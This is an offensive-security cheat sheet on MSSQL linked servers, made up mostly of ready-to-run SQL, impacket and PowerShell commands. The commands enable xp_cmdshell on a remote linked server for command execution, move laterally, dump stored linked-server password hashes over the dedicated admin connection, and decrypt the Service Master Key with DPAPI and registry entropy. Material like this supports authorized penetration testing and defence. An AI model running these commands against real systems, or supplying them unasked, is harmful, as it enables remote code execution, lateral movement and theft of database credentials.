# 17.07 MSSQL Linked Servers full

> Chain `EXECUTE...AT` through linked servers for remote `xp_cmdshell`; decrypt stored linked-server creds with the Service Master Key + DPAPI.

## Overview

Linked servers allow executing queries and commands on remote SQL instances. Chain xp_cmdshell execution through EXECUTE...AT syntax. Also extract and decrypt linked server credentials post-compromise using the Service Master Key and DPAPI.

## Steps

- sp_linkedservers enumerates linked connections; OPENQUERY returns remote data
- Verify remote sysadmin with IS_SRVROLEMEMBER via OPENQUERY (escape single quotes with '')
- Enable advanced options and xp_cmdshell on linked server via EXECUTE...AT
- impacket use_link command switches context to linked server transparently
- Post-exploitation: dump encrypted creds from sys.syslnklgns via DAC connection (ADMIN:server)
- Decrypt with PowerShell DPAPI + entropy from HKLM registry; split pwdhash into IV + Ciphertext
- Automated: import Get-MSSQLLinkPasswords PowerShell module from NetSPI

## Commands

### Check remote sysadmin

```sql
SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

### Execute xp_cmdshell on linked server

```sql
EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE; EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
```

### impacket use_link lateral movement

```text
SQL (ws_dev  guest@master)> use_link SQL02
```

### Dump encrypted linked server passwords (DAC)

```sql
SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash FROM master.sys.syslnklgns INNER JOIN master.sys.sysservers ON syslnklgns.srvid = sysservers.srvid WHERE LEN(pwdhash) > 0;
```

### Split pwdhash into IV + Ciphertext

```sql
SELECT name, SUBSTRING(pwdhash, 5, 16) AS 'IV', SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext' FROM sys.syslnklgns WHERE LEN(pwdhash) > 0;
```

### Decrypt Service Master Key (PowerShell)

```powershell
$encryptedData = "0xFFFFFFFF500100<SNIP>"; $encryptedData = $encryptedData.Substring(18); $encryptedData = -split ($encryptedData -replace '..', '0x$& '); $entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy; Add-Type -AssemblyName System.Security; $SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine'); Write-Host (($SMK|ForEach-Object ToString X2) -join '');
```
